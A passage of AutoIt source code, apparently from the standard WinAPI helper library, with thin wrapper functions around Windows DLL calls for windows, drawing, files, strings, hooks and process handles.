	_WinAPI_GUIDFromStringEx($sguid, $tguid)
	If @error Then Return SetError(@error, @extended, 0)
	Return $tguid
EndFunc   ;==>_WinAPI_GUIDFromString

Func _WinAPI_GUIDFromStringEx($sguid, $pguid)
	Local $aresult = DllCall("ole32.dll", "long", "CLSIDFromString", "wstr", $sguid, "struct*", $pguid)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GUIDFromStringEx

Func _WinAPI_HiWord($ilong)
	Return BitShift($ilong, 16)
EndFunc   ;==>_WinAPI_HiWord

Func _WinAPI_InProcess($hwnd, ByRef $hlastwnd)
	If $hwnd = $hlastwnd Then Return True
	For $ii = $__gainprocess_winapi[0][0] To 1 Step -1
		If $hwnd = $__gainprocess_winapi[$ii][0] Then
			If $__gainprocess_winapi[$ii][1] Then
				$hlastwnd = $hwnd
				Return True
			Else
				Return False
			EndIf
		EndIf
	Next
	Local $iprocessid
	_WinAPI_GetWindowThreadProcessId($hwnd, $iprocessid)
	Local $icount = $__gainprocess_winapi[0][0] + 1
	If $icount >= 64 Then $icount = 1
	$__gainprocess_winapi[0][0] = $icount
	$__gainprocess_winapi[$icount][0] = $hwnd
	$__gainprocess_winapi[$icount][1] = ($iprocessid = @AutoItPID)
	Return $__gainprocess_winapi[$icount][1]
EndFunc   ;==>_WinAPI_InProcess

Func _WinAPI_IntToFloat($iint)
	Local $tint = DllStructCreate("int")
	Local $tfloat = DllStructCreate("float", DllStructGetPtr($tint))
	DllStructSetData($tint, 1, $iint)
	Return DllStructGetData($tfloat, 1)
EndFunc   ;==>_WinAPI_IntToFloat

Func _WinAPI_IsClassName($hwnd, $sclassname)
	Local $sseparator = Opt("GUIDataSeparatorChar")
	Local $aclassname = StringSplit($sclassname, $sseparator)
	If Not IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
	Local $sclasscheck = _WinAPI_GetClassName($hwnd)
	For $x = 1 To UBound($aclassname) - 1
		If StringUpper(StringMid($sclasscheck, 1, StringLen($aclassname[$x]))) = StringUpper($aclassname[$x]) Then Return True
	Next
	Return False
EndFunc   ;==>_WinAPI_IsClassName

Func _WinAPI_IsWindow($hwnd)
	Local $aresult = DllCall("user32.dll", "bool", "IsWindow", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_IsWindow

Func _WinAPI_IsWindowVisible($hwnd)
	Local $aresult = DllCall("user32.dll", "bool", "IsWindowVisible", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_IsWindowVisible

Func _WinAPI_InvalidateRect($hwnd, $trect = 0, $ferase = True)
	Local $aresult = DllCall("user32.dll", "bool", "InvalidateRect", "hwnd", $hwnd, "struct*", $trect, "bool", $ferase)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_InvalidateRect

Func _WinAPI_LineTo($hdc, $ix, $iy)
	Local $aresult = DllCall("gdi32.dll", "bool", "LineTo", "handle", $hdc, "int", $ix, "int", $iy)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_LineTo

Func _WinAPI_LoadBitmap($hinstance, $sbitmap)
	Local $sbitmaptype = "int"
	If IsString($sbitmap) Then $sbitmaptype = "wstr"
	Local $aresult = DllCall("user32.dll", "handle", "LoadBitmapW", "handle", $hinstance, $sbitmaptype, $sbitmap)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_LoadBitmap

Func _WinAPI_LoadImage($hinstance, $simage, $itype, $ixdesired, $iydesired, $iload)
	Local $aresult, $simagetype = "int"
	If IsString($simage) Then $simagetype = "wstr"
	$aresult = DllCall("user32.dll", "handle", "LoadImageW", "handle", $hinstance, $simagetype, $simage, "uint", $itype, "int", $ixdesired, "int", $iydesired, "uint", $iload)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_LoadImage

Func _WinAPI_LoadLibrary($sfilename)
	Local $aresult = DllCall("kernel32.dll", "handle", "LoadLibraryW", "wstr", $sfilename)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_LoadLibrary

Func _WinAPI_LoadLibraryEx($sfilename, $iflags = 0)
	Local $aresult = DllCall("kernel32.dll", "handle", "LoadLibraryExW", "wstr", $sfilename, "ptr", 0, "dword", $iflags)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_LoadLibraryEx

Func _WinAPI_LoadShell32Icon($iiconid)
	Local $ticons = DllStructCreate("ptr Data")
	Local $iicons = _WinAPI_ExtractIconEx("shell32.dll", $iiconid, 0, $ticons, 1)
	If @error Then Return SetError(@error, @extended, 0)
	If $iicons <= 0 Then Return SetError(1, 0, 0)
	Return DllStructGetData($ticons, "Data")
EndFunc   ;==>_WinAPI_LoadShell32Icon

Func _WinAPI_LoadString($hinstance, $istringid)
	Local $aresult = DllCall("user32.dll", "int", "LoadStringW", "handle", $hinstance, "uint", $istringid, "wstr", "", "int", 4096)
	If @error Then Return SetError(@error, @extended, "")
	Return SetExtended($aresult[0], $aresult[3])
EndFunc   ;==>_WinAPI_LoadString

Func _WinAPI_LocalFree($hmem)
	Local $aresult = DllCall("kernel32.dll", "handle", "LocalFree", "handle", $hmem)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_LocalFree

Func _WinAPI_LoWord($ilong)
	Return BitAND($ilong, 65535)
EndFunc   ;==>_WinAPI_LoWord

Func _WinAPI_MAKELANGID($lgidprimary, $lgidsub)
	Return BitOR(BitShift($lgidsub, -10), $lgidprimary)
EndFunc   ;==>_WinAPI_MAKELANGID

Func _WinAPI_MAKELCID($lgid, $srtid)
	Return BitOR(BitShift($srtid, -16), $lgid)
EndFunc   ;==>_WinAPI_MAKELCID

Func _WinAPI_MakeLong($ilo, $ihi)
	Return BitOR(BitShift($ihi, -16), BitAND($ilo, 65535))
EndFunc   ;==>_WinAPI_MakeLong

Func _WinAPI_MakeQWord($lodword, $hidword)
	Local $tint64 = DllStructCreate("uint64")
	Local $tdwords = DllStructCreate("dword;dword", DllStructGetPtr($tint64))
	DllStructSetData($tdwords, 1, $lodword)
	DllStructSetData($tdwords, 2, $hidword)
	Return DllStructGetData($tint64, 1)
EndFunc   ;==>_WinAPI_MakeQWord

Func _WinAPI_MessageBeep($itype = 1)
	Local $isound
	Switch $itype
		Case 1
			$isound = 0
		Case 2
			$isound = 16
		Case 3
			$isound = 32
		Case 4
			$isound = 48
		Case 5
			$isound = 64
		Case Else
			$isound = -1
	EndSwitch
	Local $aresult = DllCall("user32.dll", "bool", "MessageBeep", "uint", $isound)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_MessageBeep

Func _WinAPI_MsgBox($iflags, $stitle, $stext)
	BlockInput(0)
	MsgBox($iflags, $stitle, $stext & "      ")
EndFunc   ;==>_WinAPI_MsgBox

Func _WinAPI_Mouse_Event($iflags, $ix = 0, $iy = 0, $idata = 0, $iextrainfo = 0)
	DllCall("user32.dll", "none", "mouse_event", "dword", $iflags, "dword", $ix, "dword", $iy, "dword", $idata, "ulong_ptr", $iextrainfo)
	If @error Then Return SetError(@error, @extended)
EndFunc   ;==>_WinAPI_Mouse_Event

Func _WinAPI_MoveTo($hdc, $ix, $iy)
	Local $aresult = DllCall("gdi32.dll", "bool", "MoveToEx", "handle", $hdc, "int", $ix, "int", $iy, "ptr", 0)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_MoveTo

Func _WinAPI_MoveWindow($hwnd, $ix, $iy, $iwidth, $iheight, $frepaint = True)
	Local $aresult = DllCall("user32.dll", "bool", "MoveWindow", "hwnd", $hwnd, "int", $ix, "int", $iy, "int", $iwidth, "int", $iheight, "bool", $frepaint)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_MoveWindow

Func _WinAPI_MulDiv($inumber, $inumerator, $idenominator)
	Local $aresult = DllCall("kernel32.dll", "int", "MulDiv", "int", $inumber, "int", $inumerator, "int", $idenominator)
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_MulDiv

Func _WinAPI_MultiByteToWideChar($stext, $icodepage = 0, $iflags = 0, $bretstring = False)
	Local $stexttype = "str"
	If Not IsString($stext) Then $stexttype = "struct*"
	Local $aresult = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, $stexttype, $stext, "int", -1, "ptr", 0, "int", 0)
	If @error Then Return SetError(@error, @extended, 0)
	Local $iout = $aresult[0]
	Local $tout = DllStructCreate("wchar[" & $iout & "]")
	$aresult = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, $stexttype, $stext, "int", -1, "struct*", $tout, "int", $iout)
	If @error Then Return SetError(@error, @extended, 0)
	If $bretstring Then Return DllStructGetData($tout, 1)
	Return $tout
EndFunc   ;==>_WinAPI_MultiByteToWideChar

Func _WinAPI_MultiByteToWideCharEx($stext, $ptext, $icodepage = 0, $iflags = 0)
	Local $aresult = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, "STR", $stext, "int", -1, "struct*", $ptext, "int", (StringLen($stext) + 1) * 2)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_MultiByteToWideCharEx

Func _WinAPI_OpenProcess($iaccess, $finherit, $iprocessid, $fdebugpriv = False)
	Local $aresult = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", $iaccess, "bool", $finherit, "dword", $iprocessid)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return $aresult[0]
	If Not $fdebugpriv Then Return 0
	Local $htoken = _Security__OpenThreadTokenEx(BitOR($token_adjust_privileges, $token_query))
	If @error Then Return SetError(@error, @extended, 0)
	_Security__SetPrivilege($htoken, "SeDebugPrivilege", True)
	Local $ierror = @error
	Local $ilasterror = @extended
	Local $iret = 0
	If Not @error Then
		$aresult = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", $iaccess, "bool", $finherit, "dword", $iprocessid)
		$ierror = @error
		$ilasterror = @extended
		If $aresult[0] Then $iret = $aresult[0]
		_Security__SetPrivilege($htoken, "SeDebugPrivilege", False)
		If @error Then
			$ierror = @error
			$ilasterror = @extended
		EndIf
	EndIf
	_WinAPI_CloseHandle($htoken)
	Return SetError($ierror, $ilasterror, $iret)
EndFunc   ;==>_WinAPI_OpenProcess

Func __winapi_parsefiledialogpath($spath)
	Local $afiles[3]
	$afiles[0] = 2
	Local $stemp = StringMid($spath, 1, StringInStr($spath, "\", 0, -1) - 1)
	$afiles[1] = $stemp
	$afiles[2] = StringMid($spath, StringInStr($spath, "\", 0, -1) + 1)
	Return $afiles
EndFunc   ;==>__winapi_parsefiledialogpath

Func _WinAPI_PathFindOnPath(Const $szfile, $aextrapaths = "", Const $szpathdelimiter = @LF)
	Local $iextracount = 0
	If IsString($aextrapaths) Then
		If StringLen($aextrapaths) Then
			$aextrapaths = StringSplit($aextrapaths, $szpathdelimiter, 1 + 2)
			$iextracount = UBound($aextrapaths, 1)
		EndIf
	ElseIf IsArray($aextrapaths) Then
		$iextracount = UBound($aextrapaths)
	EndIf
	Local $tpaths, $tpathptrs
	If $iextracount Then
		Local $szstruct = ""
		For $path In $aextrapaths
			$szstruct &= "wchar[" & StringLen($path) + 1 & "];"
		Next
		$tpaths = DllStructCreate($szstruct)
		$tpathptrs = DllStructCreate("ptr[" & $iextracount + 1 & "]")
		For $i = 1 To $iextracount
			DllStructSetData($tpaths, $i, $aextrapaths[$i - 1])
			DllStructSetData($tpathptrs, 1, DllStructGetPtr($tpaths, $i), $i)
		Next
		DllStructSetData($tpathptrs, 1, Ptr(0), $iextracount + 1)
	EndIf
	Local $aresult = DllCall("shlwapi.dll", "bool", "PathFindOnPathW", "wstr", $szfile, "struct*", $tpathptrs)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] = 0 Then Return SetError(1, 0, $szfile)
	Return $aresult[1]
EndFunc   ;==>_WinAPI_PathFindOnPath

Func _WinAPI_PointFromRect(ByRef $trect, $fcenter = True)
	Local $ix1 = DllStructGetData($trect, "Left")
	Local $iy1 = DllStructGetData($trect, "Top")
	Local $ix2 = DllStructGetData($trect, "Right")
	Local $iy2 = DllStructGetData($trect, "Bottom")
	If $fcenter Then
		$ix1 = $ix1 + (($ix2 - $ix1) / 2)
		$iy1 = $iy1 + (($iy2 - $iy1) / 2)
	EndIf
	Local $tpoint = DllStructCreate($tagpoint)
	DllStructSetData($tpoint, "X", $ix1)
	DllStructSetData($tpoint, "Y", $iy1)
	Return $tpoint
EndFunc   ;==>_WinAPI_PointFromRect

Func _WinAPI_PostMessage($hwnd, $imsg, $iwparam, $ilparam)
	Local $aresult = DllCall("user32.dll", "bool", "PostMessage", "hwnd", $hwnd, "uint", $imsg, "wparam", $iwparam, "lparam", $ilparam)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_PostMessage

Func _WinAPI_PrimaryLangId($lgid)
	Return BitAND($lgid, 1023)
EndFunc   ;==>_WinAPI_PrimaryLangId

Func _WinAPI_PtInRect(ByRef $trect, ByRef $tpoint)
	Local $aresult = DllCall("user32.dll", "bool", "PtInRect", "struct*", $trect, "struct", $tpoint)
	If @error Then Return SetError(1, @extended, False)
	Return Not ($aresult[0] = 0)
EndFunc   ;==>_WinAPI_PtInRect

Func _WinAPI_ReadFile($hfile, $pbuffer, $itoread, ByRef $iread, $poverlapped = 0)
	Local $aresult = DllCall("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "ptr", $pbuffer, "dword", $itoread, "dword*", 0, "ptr", $poverlapped)
	If @error Then Return SetError(@error, @extended, False)
	$iread = $aresult[4]
	Return $aresult[0]
EndFunc   ;==>_WinAPI_ReadFile

Func _WinAPI_ReadProcessMemory($hprocess, $pbaseaddress, $pbuffer, $isize, ByRef $iread)
	Local $aresult = DllCall("kernel32.dll", "bool", "ReadProcessMemory", "handle", $hprocess, "ptr", $pbaseaddress, "ptr", $pbuffer, "ulong_ptr", $isize, "ulong_ptr*", 0)
	If @error Then Return SetError(@error, @extended, False)
	$iread = $aresult[5]
	Return $aresult[0]
EndFunc   ;==>_WinAPI_ReadProcessMemory

Func _WinAPI_RectIsEmpty(ByRef $trect)
	Return (DllStructGetData($trect, "Left") = 0) And (DllStructGetData($trect, "Top") = 0) And (DllStructGetData($trect, "Right") = 0) And (DllStructGetData($trect, "Bottom") = 0)
EndFunc   ;==>_WinAPI_RectIsEmpty

Func _WinAPI_RedrawWindow($hwnd, $trect = 0, $hregion = 0, $iflags = 5)
	Local $aresult = DllCall("user32.dll", "bool", "RedrawWindow", "hwnd", $hwnd, "struct*", $trect, "handle", $hregion, "uint", $iflags)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_RedrawWindow

Func _WinAPI_RegisterWindowMessage($smessage)
	Local $aresult = DllCall("user32.dll", "uint", "RegisterWindowMessageW", "wstr", $smessage)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_RegisterWindowMessage

Func _WinAPI_ReleaseCapture()
	Local $aresult = DllCall("user32.dll", "bool", "ReleaseCapture")
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_ReleaseCapture

Func _WinAPI_ReleaseDC($hwnd, $hdc)
	Local $aresult = DllCall("user32.dll", "int", "ReleaseDC", "hwnd", $hwnd, "handle", $hdc)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_ReleaseDC

Func _WinAPI_ScreenToClient($hwnd, ByRef $tpoint)
	Local $aresult = DllCall("user32.dll", "bool", "ScreenToClient", "hwnd", $hwnd, "struct*", $tpoint)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_ScreenToClient

Func _WinAPI_SelectObject($hdc, $hgdiobj)
	Local $aresult = DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdc, "handle", $hgdiobj)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SelectObject

Func _WinAPI_SetBkColor($hdc, $icolor)
	Local $aresult = DllCall("gdi32.dll", "INT", "SetBkColor", "handle", $hdc, "dword", $icolor)
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetBkColor

Func _WinAPI_SetBkMode($hdc, $ibkmode)
	Local $aresult = DllCall("gdi32.dll", "int", "SetBkMode", "handle", $hdc, "int", $ibkmode)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetBkMode

Func _WinAPI_SetCapture($hwnd)
	Local $aresult = DllCall("user32.dll", "hwnd", "SetCapture", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetCapture

Func _WinAPI_SetCursor($hcursor)
	Local $aresult = DllCall("user32.dll", "handle", "SetCursor", "handle", $hcursor)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetCursor

Func _WinAPI_SetDefaultPrinter($sprinter)
	Local $aresult = DllCall("winspool.drv", "bool", "SetDefaultPrinterW", "wstr", $sprinter)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetDefaultPrinter

Func _WinAPI_SetDIBits($hdc, $hbmp, $istartscan, $iscanlines, $pbits, $pbmi, $icoloruse = 0)
	Local $aresult = DllCall("gdi32.dll", "int", "SetDIBits", "handle", $hdc, "handle", $hbmp, "uint", $istartscan, "uint", $iscanlines, "ptr", $pbits, "ptr", $pbmi, "uint", $icoloruse)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetDIBits

Func _WinAPI_SetEndOfFile($hfile)
	Local $aresult = DllCall("kernel32.dll", "bool", "SetEndOfFile", "handle", $hfile)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetEndOfFile

Func _WinAPI_SetEvent($hevent)
	Local $aresult = DllCall("kernel32.dll", "bool", "SetEvent", "handle", $hevent)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetEvent

Func _WinAPI_SetFilePointer($hfile, $ipos, $imethod = 0)
	Local $aresult = DllCall("kernel32.dll", "INT", "SetFilePointer", "handle", $hfile, "long", $ipos, "ptr", 0, "long", $imethod)
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetFilePointer

Func _WinAPI_SetFocus($hwnd)
	Local $aresult = DllCall("user32.dll", "hwnd", "SetFocus", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetFocus

Func _WinAPI_SetFont($hwnd, $hfont, $fredraw = True)
	_SendMessage($hwnd, $__winapiconstant_wm_setfont, $hfont, $fredraw, 0, "hwnd")
EndFunc   ;==>_WinAPI_SetFont

Func _WinAPI_SetHandleInformation($hobject, $imask, $iflags)
	Local $aresult = DllCall("kernel32.dll", "bool", "SetHandleInformation", "handle", $hobject, "dword", $imask, "dword", $iflags)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetHandleInformation

Func _WinAPI_SetLayeredWindowAttributes($hwnd, $i_transcolor, $transparency = 255, $dwflags = 3, $iscolorref = False)
	If $dwflags = Default Or $dwflags = "" Or $dwflags < 0 Then $dwflags = 3
	If Not $iscolorref Then
		$i_transcolor = Int(BinaryMid($i_transcolor, 3, 1) & BinaryMid($i_transcolor, 2, 1) & BinaryMid($i_transcolor, 1, 1))
	EndIf
	Local $aresult = DllCall("user32.dll", "bool", "SetLayeredWindowAttributes", "hwnd", $hwnd, "dword", $i_transcolor, "byte", $transparency, "dword", $dwflags)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetLayeredWindowAttributes

Func _WinAPI_SetParent($hwndchild, $hwndparent)
	Local $aresult = DllCall("user32.dll", "hwnd", "SetParent", "hwnd", $hwndchild, "hwnd", $hwndparent)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetParent

Func _WinAPI_SetProcessAffinityMask($hprocess, $imask)
	Local $aresult = DllCall("kernel32.dll", "bool", "SetProcessAffinityMask", "handle", $hprocess, "ulong_ptr", $imask)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetProcessAffinityMask

Func _WinAPI_SetSysColors($velements, $vcolors)
	Local $isearray = IsArray($velements), $iscarray = IsArray($vcolors)
	Local $ielementnum
	If Not $iscarray And Not $isearray Then
		$ielementnum = 1
	ElseIf $iscarray Or $isearray Then
		If Not $iscarray Or Not $isearray Then Return SetError(-1, -1, False)
		If UBound($velements) <> UBound($vcolors) Then Return SetError(-1, -1, False)
		$ielementnum = UBound($velements)
	EndIf
	Local $telements = DllStructCreate("int Element[" & $ielementnum & "]")
	Local $tcolors = DllStructCreate("dword NewColor[" & $ielementnum & "]")
	If Not $isearray Then
		DllStructSetData($telements, "Element", $velements, 1)
	Else
		For $x = 0 To $ielementnum - 1
			DllStructSetData($telements, "Element", $velements[$x], $x + 1)
		Next
	EndIf
	If Not $iscarray Then
		DllStructSetData($tcolors, "NewColor", $vcolors, 1)
	Else
		For $x = 0 To $ielementnum - 1
			DllStructSetData($tcolors, "NewColor", $vcolors[$x], $x + 1)
		Next
	EndIf
	Local $aresult = DllCall("user32.dll", "bool", "SetSysColors", "int", $ielementnum, "struct*", $telements, "struct*", $tcolors)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetSysColors

Func _WinAPI_SetTextColor($hdc, $icolor)
	Local $aresult = DllCall("gdi32.dll", "INT", "SetTextColor", "handle", $hdc, "dword", $icolor)
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetTextColor

Func _WinAPI_SetWindowLong($hwnd, $iindex, $ivalue)
	Local $sfuncname = "SetWindowLongW"
	If @AutoItX64 Then $sfuncname = "SetWindowLongPtrW"
	Local $aresult = DllCall("user32.dll", "long_ptr", $sfuncname, "hwnd", $hwnd, "int", $iindex, "long_ptr", $ivalue)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetWindowLong

Func _WinAPI_SetWindowPlacement($hwnd, $pwindowplacement)
	Local $aresult = DllCall("user32.dll", "bool", "SetWindowPlacement", "hwnd", $hwnd, "ptr", $pwindowplacement)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetWindowPlacement

Func _WinAPI_SetWindowPos($hwnd, $hafter, $ix, $iy, $icx, $icy, $iflags)
	Local $aresult = DllCall("user32.dll", "bool", "SetWindowPos", "hwnd", $hwnd, "hwnd", $hafter, "int", $ix, "int", $iy, "int", $icx, "int", $icy, "uint", $iflags)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetWindowPos

Func _WinAPI_SetWindowRgn($hwnd, $hrgn, $bredraw = True)
	Local $aresult = DllCall("user32.dll", "int", "SetWindowRgn", "hwnd", $hwnd, "handle", $hrgn, "bool", $bredraw)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetWindowRgn

Func _WinAPI_SetWindowsHookEx($idhook, $lpfn, $hmod, $dwthreadid = 0)
	Local $aresult = DllCall("user32.dll", "handle", "SetWindowsHookEx", "int", $idhook, "ptr", $lpfn, "handle", $hmod, "dword", $dwthreadid)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetWindowsHookEx

Func _WinAPI_SetWindowText($hwnd, $stext)
	Local $aresult = DllCall("user32.dll", "bool", "SetWindowTextW", "hwnd", $hwnd, "wstr", $stext)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SetWindowText

Func _WinAPI_ShowCursor($fshow)
	Local $aresult = DllCall("user32.dll", "int", "ShowCursor", "bool", $fshow)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_ShowCursor

Func _WinAPI_ShowError($stext, $fexit = True)
	_WinAPI_MsgBox(266256, "Error", $stext)
	If $fexit Then Exit
EndFunc   ;==>_WinAPI_ShowError

Func _WinAPI_ShowMsg($stext)
	_WinAPI_MsgBox(64 + 4096, "Information", $stext)
EndFunc   ;==>_WinAPI_ShowMsg

Func _WinAPI_ShowWindow($hwnd, $icmdshow = 5)
	Local $aresult = DllCall("user32.dll", "bool", "ShowWindow", "hwnd", $hwnd, "int", $icmdshow)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_ShowWindow

Func _WinAPI_StringFromGUID($pguid)
	Local $aresult = DllCall("ole32.dll", "int", "StringFromGUID2", "struct*", $pguid, "wstr", "", "int", 40)
	If @error Then Return SetError(@error, @extended, "")
	Return SetExtended($aresult[0], $aresult[2])
EndFunc   ;==>_WinAPI_StringFromGUID

Func _WinAPI_StringLenA($vstring)
	Local $acall = DllCall("kernel32.dll", "int", "lstrlenA", "struct*", $vstring)
	If @error Then Return SetError(1, @extended, 0)
	Return $acall[0]
EndFunc   ;==>_WinAPI_StringLenA

Func _WinAPI_StringLenW($vstring)
	Local $acall = DllCall("kernel32.dll", "int", "lstrlenW", "struct*", $vstring)
	If @error Then Return SetError(1, @extended, 0)
	Return $acall[0]
EndFunc   ;==>_WinAPI_StringLenW

Func _WinAPI_SubLangId($lgid)
	Return BitShift($lgid, 10)
EndFunc   ;==>_WinAPI_SubLangId

Func _WinAPI_SystemParametersInfo($iaction, $iparam = 0, $vparam = 0, $iwinini = 0)
	Local $aresult = DllCall("user32.dll", "bool", "SystemParametersInfoW", "uint", $iaction, "uint", $iparam, "ptr", $vparam, "uint", $iwinini)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_SystemParametersInfo

Func _WinAPI_TwipsPerPixelX()
	Local $lngdc, $twipsperpixelx
	$lngdc = _WinAPI_GetDC(0)
	$twipsperpixelx = 1440 / _WinAPI_GetDeviceCaps($lngdc, $__winapiconstant_logpixelsx)
	_WinAPI_ReleaseDC(0, $lngdc)
	Return $twipsperpixelx
EndFunc   ;==>_WinAPI_TwipsPerPixelX

Func _WinAPI_TwipsPerPixelY()
	Local $lngdc, $twipsperpixely
	$lngdc = _WinAPI_GetDC(0)
	$twipsperpixely = 1440 / _WinAPI_GetDeviceCaps($lngdc, $__winapiconstant_logpixelsy)
	_WinAPI_ReleaseDC(0, $lngdc)
	Return $twipsperpixely
EndFunc   ;==>_WinAPI_TwipsPerPixelY

Func _WinAPI_UnhookWindowsHookEx($hhk)
	Local $aresult = DllCall("user32.dll", "bool", "UnhookWindowsHookEx", "handle", $hhk)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_UnhookWindowsHookEx

Func _WinAPI_UpdateLayeredWindow($hwnd, $hdcdest, $pptdest, $psize, $hdcsrce, $pptsrce, $irgb, $pblend, $iflags)
	Local $aresult = DllCall("user32.dll", "bool", "UpdateLayeredWindow", "hwnd", $hwnd, "handle", $hdcdest, "ptr", $pptdest, "ptr", $psize, "handle", $hdcsrce, "ptr", $pptsrce, "dword", $irgb, "ptr", $pblend, "dword", $iflags)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_UpdateLayeredWindow

Func _WinAPI_UpdateWindow($hwnd)
	Local $aresult = DllCall("user32.dll", "bool", "UpdateWindow", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_UpdateWindow

Func _WinAPI_WaitForInputIdle($hprocess, $itimeout = -1)
	Local $aresult = DllCall("user32.dll", "dword", "WaitForInputIdle", "handle", $hprocess, "dword", $itimeout)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_WaitForInputIdle

Func _WinAPI_WaitForMultipleObjects($icount, $phandles, $fwaitall = False, $itimeout = -1)
	Local $aresult = DllCall("kernel32.dll", "INT", "WaitForMultipleObjects", "dword", $icount, "ptr", $phandles, "bool", $fwaitall, "dword", $itimeout)
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_WaitForMultipleObjects

Func _WinAPI_WaitForSingleObject($hhandle, $itimeout = -1)
	Local $aresult = DllCall("kernel32.dll", "INT", "WaitForSingleObject", "handle", $hhandle, "dword", $itimeout)
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_WaitForSingleObject

Func _WinAPI_WideCharToMultiByte($punicode, $icodepage = 0, $bretstring = True)
	Local $sunicodetype = "wstr"
	If Not IsString($punicode) Then $sunicodetype = "struct*"
